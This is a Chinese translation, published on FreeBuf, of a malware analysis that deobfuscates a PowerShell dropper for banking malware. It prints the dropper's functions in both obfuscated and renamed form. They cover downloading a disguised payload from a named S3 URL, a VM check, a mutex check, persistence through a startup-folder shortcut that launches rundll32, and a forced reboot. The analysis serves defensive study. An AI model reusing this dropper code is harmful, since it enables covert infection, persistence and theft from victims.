        ${___/\_/=\_/=\_/\/} = Get-Random -Minimum 1 -Maximum 9
        ${_/\/\_/\/\_/=\/\/} = ""
        For (${/==\/\___/\_/\/==}=0; ${/==\/\___/\_/\/==} -le ${___/\_/=\_/=\_/\/}; ${/==\/\___/\_/\/==}++) 
        {
          qwertyuioplkjhgfdsazxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM  = $('qwertyuioplkjhgfdsazxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM')
          nomeRandomico_getrandom  = Get-Random -Minimum 1 -Maximum qwertyuioplkjhgfdsazxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM.Length
          caractereRandomico = qwertyuioplkjhgfdsazxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM.Substring(nomeRandomico_getrandom,1)
          ${_/\/\_/\/\_/=\/\/} = ${_/\/\_/\/\_/=\/\/}+caractereRandomico   
        }
        return ${_/\/\_/\/\_/=\/\/} 
      }
      finally{}
    }
    

首先，可以观察到for循环。变量`/ == \ / \ ___ / \ _ / \ / ==`命名为`i`，循环迭代的次数等于`___ / \ _ / =
\ _ / = \ _ / \ /`的值。该变量设置为1到9之间的随机值，并定义for循环的长度。可以将其重命名为`length`。那么最后一个变量`_ /
\ / \ __ / \ / \ _ / = \ / \ /`是返回值，可以重命名为`returnValue`。

查看重构的代码，该功能的目的显而易见。

    
    
     try
      {
        ${length} = Get-Random -Minimum 1 -Maximum 9
        ${returnValue} = ""
        For (${i}=0; ${i} -le ${length}; ${i}++) 
        {
          qwertyuioplkjhgfdsazxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM  = $('qwertyuioplkjhgfdsazxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM')
          nomeRandomico_getrandom  = Get-Random -Minimum 1 -Maximum qwertyuioplkjhgfdsazxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM.Length
          caractereRandomico = qwertyuioplkjhgfdsazxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM.Substring(nomeRandomico_getrandom,1)
          ${returnValue} = ${returnValue}+caractereRandomico   
        }
        return ${returnValue} 
      }
      finally{}
    

从字符集`qwertyuioplkjhgfdsazxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM`中，随机复制字符1至9次。然后返回连接的输出，提供伪随机字符串。可以将函数`____
/ \ __ / === \ _ / = \ /`重命名为`getRandomString`。

下一个功能更长，但是从一开始就提供更多信息，因为它使用了点网系统的各个部分，在这些部分中字符串没有被混淆。代码如下。

    
    
    function __/====\___/=\_/\_(${___/\/\_/\_/=\__/\}, ${___/==\/=\/=\____/})
    {
        ${/=\_/\/====\/\_/\} = New-Object $('System.uri') $ExecutionContext.InvokeCommand.ExpandString($S{___/\/\_/\_/=\__/\}) 
        ${/=\/===\_/\/\_/\_} = [System.Net.HttpWebRequest]::Create(${/=\_/\/====\/\_/\}) 
        ${/=\/===\_/\/\_/\_}.set_Timeout(15000) 
        ${/=\/====\__/==\__} = ${/=\/===\_/\/\_/\_}.GetResponse() 
        ${/=\_/==\__/\__/\_} = [System.Math]::Floor(${/=\/====\__/==\__}.get_ContentLength()/1024) 
        ${_/===\/=\_/=\___/} = ${/=\/====\__/==\__}.GetResponseStream() 
        ${__/====\__/\/\__/} = New-Object -TypeName System.IO.FileStream -ArgumentList ${___/==\/=\/=\____/}, Create 
        ${/=\/=\/==\_/\/=\_} = new-object byte[] 10KB 
        ${_/===\_/=\/\/===\} = ${_/===\/=\_/=\___/}.Read(${/=\/=\/==\_/\/=\_},0,${/=\/=\/==\_/\/=\_}.length) 
        ${/==\_/===\/\/=\/\} = ${_/===\_/=\/\/===\} 
        while (${_/===\_/=\/\/===\} -gt 0) 
        { 
            ${__/====\__/\/\__/}.Write(${/=\/=\/==\_/\/=\_}, 0, ${_/===\_/=\/\/===\}) 
            ${_/===\_/=\/\/===\} = ${_/===\/=\_/=\___/}.Read(${/=\/=\/==\_/\/=\_},0,${/=\/=\/==\_/\/=\_}.length) 
            ${/==\_/===\/\/=\/\} = ${/==\_/===\/\/=\/\} + ${_/===\_/=\/\/===\} 
        } 
        ${__/====\__/\/\__/}.Flush()
        ${__/====\__/\/\__/}.Close() 
        ${__/====\__/\/\__/}.Dispose() 
        ${_/===\/=\_/=\___/}.Dispose() 
        return "Y"
    }
    

该函数的第一个参数`___ / \ / \ _ / \ _ / = \ __ /
\`用于第一行，其中调用了`System.Uri`类。给定的输入是`url`，可以这样重命名。

在下面的代码行中，变量`/ = \ / === \ _ / \ // __ / \
_`用于创建`Syste.Net.HttpWebRequest`对象。因此，该变量可以重命名为`httpWebRequest`。

在此之后的两行，请求的响应保存在变量`/ = \ / ==== \ __ / == \
__`中。因此，该变量可以重命名为`httpResponse`。函数`get_ContentLength`返回`responseContentLength`（以前是`/
= \ _ / == \ __ / \ __ / \ _`），而`GetResponseStream`函数返回了`responseStream`（以前是`_
/ === \ / = \ _ / = \ ___ /`）。

可以在原始名称`__ / ==== \ __ / \ / \ __ /`下找到`Dot Net
System.IO.FileStream`。改成更具可读性的名称`fileStream`。

下面的循环使用[Dot Net FileStream Write函数](https://docs.microsoft.com/en-us/dotnet/api/system.io.filestream.write?view=netframework-4.7.2)将数据写入磁盘。重构代码如下。

    
    
    function downloadFileAndWriteToFile(${url}, ${argumentList})
    {
        ${uri} = New-Object $('System.Uri') $ExecutionContext.InvokeCommand.ExpandString($S{url}) 
        ${httpWebRequest} = [System.Net.HttpWebRequest]::Create(${uri}) 
        ${httpWebRequest}.set_Timeout(15000) 
        ${httpResponse} = ${httpWebRequest}.GetResponse() 
        ${responseContentLength} = [System.Math]::Floor(${httpResponse}.get_ContentLength()/1024) 
        ${responseStream} = ${httpResponse}.GetResponseStream() 
        ${fileStream} = New-Object -TypeName System.IO.FileStream -ArgumentList ${argumentList}, Create 
        ${arrayToWrite} = new-object byte[] 10KB 
        ${sizeToWrite} = ${responseStream}.Read(${arrayToWrite},0,${arrayToWrite}.length) 
        ${counter} = ${sizeToWrite} 
        while (${sizeToWrite} -gt 0) 
        { 
            ${fileStream}.Write(${arrayToWrite}, 0, ${sizeToWrite}) #byte[] array, int offset, int count 
            ${sizeToWrite} = ${responseStream}.Read(${arrayToWrite},0,${arrayToWrite}.length) 
            ${counter} = ${counter} + ${sizeToWrite} 
        } 
        ${fileStream}.Flush()
        ${fileStream}.Close() 
        ${fileStream}.Dispose() 
        ${responseStream}.Dispose() 
        return "Y"
    }
    

下一个函数包含较少的变量，使重构代码更加容易。

    
    
    function _____/==\_/=\_/===
    {
      Param([string]${_/=====\/==\/\___/},[string]${___/\____/\_/=\/\_});
      try{  
        ${_/\/=\/\/===\/\/\} = New-Object -ComObject WScript.Shell 
        ${/=\/=\/\/=\_/=\__} = ${_/\/=\/\/===\/\/\}.CreateShortcut(${_/=====\/==\/\___/}) 
        ${/=\/=\/\/=\_/=\__}.TargetPath = 'powershell'
        ${/=\/=\/\/=\_/=\__}.Arguments = $ExecutionContext.InvokeCommand.ExpandString('$S{___/\/\_/\_/=\__/\}')
        ${/=\/=\/\/=\_/=\__}.WorkingDirectory = $('%SystemRoot%\System32')
        ${/=\/=\/\/=\_/=\__}.WindowStyle = 7   
        ${/=\/=\/\/=\_/=\__}.IconLocation = $('%ProgramFiles%\Internet Explorer\iexplore.exe,1')
        ${/=\/=\/\/=\_/=\__}.Save()
      }finally{}
    }
    

在函数的第一行中，实例化了`WScript.Shell`对象。因此，变量`_
/\/=\/\/===\/\/\`可以重命名为`wscriptShellObject`。在第二行中，使用了两个变量。两者都可以根据此信息重命名。变量`_ /
===== \ / == \ / \ ___
/`是快捷方式的`targetLocation`，因为它是作为参数传递的。快捷方式对象由`CreateShortcut`方法返回，使`/ = \ / = \
/ \\ / = \ _ / = \ __`等于`createShortcut`。

变量`____ / \ / \ _ / \ _ / = \ __ / \`等于`createShortcut`的参数。重构代码如下。

    
    
    function createShortcut
    {
      Param([string]${targetLocation},[string]${unusedCommand});
      try{  
        ${wscriptShellObject} = New-Object -ComObject WScript.Shell 
        ${shortcut} = ${wscriptShellObject}.CreateShortcut(${targetLocation}) 
        ${shortcut}.TargetPath = 'powershell'
        ${shortcut}.Arguments = $ExecutionContext.InvokeCommand.ExpandString($S{arguments})
        ${shortcut}.WorkingDirectory = $('%SystemRoot%\System32')
        ${shortcut}.WindowStyle = 7   
        ${shortcut}.IconLocation = $('%ProgramFiles%\Internet Explorer\iexplore.exe,1')
        ${shortcut}.Save()
      }finally{}
    }
    

根据提供的目标位置，在系统上创建一个新的快捷方式。该图标是驻留在iexplore.exe二进制文件中的第二个图标（第一个索引）。窗口样式7用于最小化窗口并将下一个窗口聚焦在屏幕上。该快捷方式将与提供的参数一起在％StystemRoot％\
System32目录中执行Powershell 。

脚本中的最后一个函数如下。

    
    
    function _/=\/\_/\/===\_/==
    {
      try
      {
        ${_/======\_/\/=\/\} = New-Object System.Threading.Mutex($false, $('444444444444'))
        return ${_/======\_/\/=\/\}.WaitOne()  
      }finally{}
    }
    

此函数中使用了`System.Threading.Mutex`，并且可以这样重构`_ / ====== \ _ / \ // = \ /
\`。互斥锁用于确保一次仅运行一个实例。重构代码如下。

    
    
    function mutexCheck
    {
      try
      {
        ${threadingMutex} = New-Object System.Threading.Mutex($false, $('444444444444'))
        return ${threadingMutex}.WaitOne()  
      }finally{}
    }
    

### 全部放在一起

现在，所有函数都已重构，需要分析执行的代码，因为它显示了调用函数的顺序以及为函数提供了参数的顺序。代码如下。

    
    
    ${amazonUrl} = $('https://s3-eu-west-1.amazonaws.com/juremasobra2/image2.png')
    _.dll = $('_.dll')
    _.prx = $('_.prx')
    MaxNotify   = $('MaxNotify')
     
      if (vmCheck -eq "N")
      {
      if (mutexCheck)  {
         stop-process -name wmplayer 
        ${___/\/===\____/\/} = ${env:APPDATA}+"\"
        ${/=\______/=\/==\/} = getRandomString
        ${/===\/=\/\_/=\/==} = $('.txt')
        ${_/=\/===\/\___/\_} = $('.vbs')
        ${/=\/==\__/\_/\__/}  = ${___/\/===\____/\/}+${/=\______/=\/==\/}+${/===\/=\/\_/=\/==}
        ${/=\__/=\___/===\_}  = ${___/\/===\____/\/}+${/=\______/=\/==\/}+${_/=\/===\/\___/\_} 
        sleep -s 1
            ${/===\/\_/====\/=\}  = $false
            while(${/===\/\_/====\/=\} -ne $true)
            {
            downloadFileAndWriteToFile ${amazonUrl} ${/=\/==\__/\_/\__/}; sleep -s 1 
            if ((gi ${/=\/==\__/\_/\__/}).length -gt 2048kb)
             {
               ${/===\/\_/====\/=\}  = $true                                                          
               ${_/=\_/==\/=\__/\_} =  "Y" 
              } 
              else 
               {                     
                ${_/=\_/==\/=\__/\_} = "N"
               }
            Write-Host ${/===\/\_/====\/=\}
            }  
           ${_/=\_/==\/=\__/\_} =  "Y" 
            if (${_/=\_/==\/=\__/\_} -eq "Y")
              {
              ${/===\__/\/==\_/==} = ${___/\/===\____/\/}+${/=\______/=\/==\/} +$('.zip')
               ren -Path $ExecutionContext.InvokeCommand.ExpandString('${/=\/==\__/\_/\__/}') -NewName $ExecutionContext.InvokeCommand.ExpandString('${/===\__/\/==\_/==}');
              ${/=\_/=\_/===\___/} = New-Object -ComObject shell.application
              ${_/\___/\_/======\} = ${/=\_/=\_/===\___/}.NameSpace(${/===\__/\/==\_/==})               
                foreach (${_/====\/\_/\/\__/} in ${_/\___/\_/======\}.items()) 
                 {
                    ${/=\_/=\_/===\___/}.Namespace(${___/\/===\____/\/}).CopyHere(${_/====\/\_/\/\__/})
                 }
              sleep -s 3 
              ${_/\_/=\_/=\_/\___} = getRandomString
              ${/=\_/===\/\_/===\} = ${_/\_/=\_/=\_/\___} + ('.prx')
              ${_/\_/=\_/=\_/\___} = ${_/\_/=\_/=\_/\___} + ('.dll')
              ren -Path $ExecutionContext.InvokeCommand.ExpandString('$env:APPDATA\${_/\/\_/\_/=\/====}') -NewName $ExecutionContext.InvokeCommand.ExpandString('$env:APPDATA\${_/\_/=\_/=\_/\___}');
              ren -Path $ExecutionContext.InvokeCommand.ExpandString('$env:APPDATA\${_/\____/=\/\_/===}') -NewName $ExecutionContext.InvokeCommand.ExpandString('$env:APPDATA\${/=\_/===\/\_/===\}');
              sleep -s 3 
              cd $env:APPDATA ; 
              shellObjeto = New-Object -Com WScript.Shell
              ${_/=\/\/\/=\__/\/=} = shellObjeto.SpecialFolders.Item($('startup');
              del ${_/=\/\/\/=\__/\/=}\*.vbs
              del ${_/=\/\/\/=\__/\/=}\*.lnk
              ${/=\______/\_/\_/=} = $ExecutionContext.InvokeCommand.ExpandString('cd $env:APPDATA; Start-Process rundll32.exe ${_/\_/=\_/=\_/\___}, ${___/=\/\/\_____/=}')
              ${___/=\/==\/\_____} = $ExecutionContext.InvokeCommand.ExpandString('${_/=\/\/\/=\__/\/=}\${/=\_/===\/\_/===\}.lnk')
              createShortcut ${___/=\/==\/\_____}  ${/=\______/\_/\_/=}
              sleep -s 40
    Restart-Computer -Force
            }
        }
      }
    

首先，执行vmCheck函数。仅当结果为负数（N）时，才会继续执行。然后，调用mutexcheck函数，以确保没有其他正在运行的实例使用相同的互斥锁（是数字4的十二倍）。如果存在名称为wmplayer的进程，则将其停止。之后，将设置多个变量并用于创建其他变量。第一部分的代码如下。

    
    
    ${amazonUrl} = $('https://s3-eu-west-1.amazonaws.com/juremasobra2/image2.png')
    _.dll = $('_.dll')
    _.prx = $('_.prx')
    MaxNotify   = $('MaxNotify')
     
     if (vmCheck -eq "N")
      {
      if (mutexCheck)  {
         stop-process -name wmplayer 
        ${AppData} = ${env:APPDATA}+"\"
        ${getRandomStringResult} = getRandomString
        ${DotTxt} = $('.txt')
        ${DotVbs} = $('.vbs')
        ${AppDataTxtFileLocation}  = ${AppData}+${getRandomStringResult}+${DotTxt}
        ${AppDataVbsFileLocation}  = ${AppData}+${getRandomStringResult}+${DotVbs} 
        sleep -s 1
    

然后，将文件下载并保存为机器的APPDATA文件夹中的文本文件，如下所示。

    
    
     ${isDownloadSucceeded}  = $false
            while(${isDownloadSucceeded} -ne $true)
            {
            downloadFileAndWriteToFile ${amazonUrl} ${AppDataTxtFileLocation}; sleep -s 1 
            if ((gi ${AppDataTxtFileLocation}).length -gt 2048kb)
             {
               ${isDownloadSucceeded}  = $true                                                          
               ${isDownloadSucceededString} =  "Y" 
              } 
              else 
               {                     
                ${isDownloadSucceededString} = "N"
               }
            Write-Host ${isDownloadSucceeded}
            }  
           ${isDownloadSucceededString} =  "Y"
    

下载完成后，压缩文件夹将重命名并解压缩。

    
    
    if (${isDownloadSucceededString} -eq "Y")  
              {  
              ${ZipFilePath} = ${AppData}+${getRandomStringResult} +$('.zip')  
               ren -Path $ExecutionContext.InvokeCommand.ExpandString(${AppDataTxtFileLocation}) -NewName $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString(${ZipFilePath});  
              ${shellApplication} = New-Object -ComObject shell.application  
              ${ZipFile} = ${shellApplication}.NameSpace(${ZipFilePath})                 
                foreach (${file} in ${ZipFile}.items())   
                 {  
                    ${shellApplication}.Namespace(${AppData}).CopyHere(${file})  
                 }  
              sleep -s 3

在下面的代码中，仍然有多个字符串被混淆，但似乎脚本没有完全完成，因为变量仅被使用，而从未实例化。在整个脚本中，已下载文件的名称被多次重命名，然后将它们放置在计算机的启动文件夹中。这是此示例中使用的持久性技术。

之后，通过rundll32.exe调用DLL 。在强制重启机器之前，睡眠功能会等待40秒。然后，使用先前设置的持久性机制使恶意软件在计算机上保持活动状态。

    
    
    ${getRandomStringResult2} = getRandomString  
              ${prxFileName} = ${getRandomStringResult2} + $('.prx')  
              ${getRandomStringResult2} = ${getRandomStringResult2} +$('.dll')  
              ren -Path $ExecutionContext.InvokeCommand.ExpandString($env:APPDATA\${_/\/\_/\_/=\/====}) -NewName $ExecutionContext.InvokeCommand.ExpandString($env:APPDATA\${getRandomStringResult2});  
              ren -Path $ExecutionContext.InvokeCommand.ExpandString($env:APPDATA\${_/\____/=\/\_/===}) -NewName $ExecutionContext.InvokeCommand.ExpandString($env:APPDATA\${prxFileName});  
              sleep -s 3   
              cd $env:APPDATA ;   
              shellObjeto = New-Object -Com WScript.Shell  
              ${startupFolder} = shellObjeto.SpecialFolders.Item('startup');          
              del ${startupFolder}\*.vbs  
              del ${startupFolder}\*.lnk  
              ${startCommand} = $ExecutionContext.InvokeCommand.ExpandString('cd $env:APPDATA; Start-Process rundll32.exe ${getRandomStringResult2}, ${___/=\/\/\_____/=}')  
              ${shortcutTargetLocation} = $ExecutionContext.InvokeCommand.ExpandString(${startupFolder}\${prxFileName}.lnk)  
              createShortcut ${shortcutTargetLocation}  ${startCommand}  
              sleep -s 40  
    Restart-Computer -Force  
            }  
        }  
      }

该恶意软件的银行活动未在本文中进行记录，因为它超出了本文的范围。

 ** _注意：文中部分敏感代码可能被Freebuf的编辑器替换，想要查看原始代码的小伙伴可以点击最下面查看原文_**

 ***参考来源：[maxkersten](https://maxkersten.nl/binary-analysis-course/malware-analysis/lnk-isesteroids-powershell-dropper/)，FB小编周大涛编译，转载请注明来自FreeBuf.COM**

